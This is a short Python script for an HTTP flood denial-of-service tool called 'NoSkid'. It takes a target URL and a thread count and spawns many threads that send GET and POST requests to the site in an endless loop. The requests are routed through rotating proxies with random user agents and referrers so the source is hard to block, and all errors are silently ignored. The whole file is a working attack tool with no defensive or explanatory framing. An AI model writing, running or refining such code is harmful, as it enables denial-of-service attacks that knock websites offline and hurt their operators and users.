import requests, random, threading

from data.theme   import C
from data.proxies import DOWNLOAD

DOWNLOAD()

PROXIES     = open('data/proxies.txt').read().splitlines()
USER_AGENTS = open('data/useragents.txt').read().splitlines()
REFERRERS   = open('data/referrers.txt').read().splitlines()

class NoSkid:

    def __init__(self,url):
        self.URL  = url
    

    def flood_url(self):
        while True:
            try:
                proxy = random.choice(PROXIES)
                
                r = requests.get(
                    url     = self.URL, 
                    headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
                    proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
                ); r.close()
                print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
                
                for _ in range(10):
                    r = requests.post(
                        url     = self.URL, 
                        headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
                        proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
                    ); r.close()
                    print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
            except:
                pass

def main():
    print(C.banner)
    print(f'{C.white}Proxies: {C.lime}{len(PROXIES)}{C.white}\n')
    
    url  = input(f'{C.white}URL:{C.cyan} ')
    
    while True:
        threads = int(input(f'{C.white}Threads (1-250):{C.cyan} '))
        
        if not threads > 251:
            break
            
        if not threads:
            threads = 250 ; break
            
        print(f'{C.red}Thread limit is 100.{C.white}\n')
        
    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')    
    session = NoSkid(url)
    print(f'{C.white}Flooding {C.cyan}{url}{C.white}...\n')
    
    for _ in range(threads):
        threading.Thread(target = session.flood_url).start()
        
main()        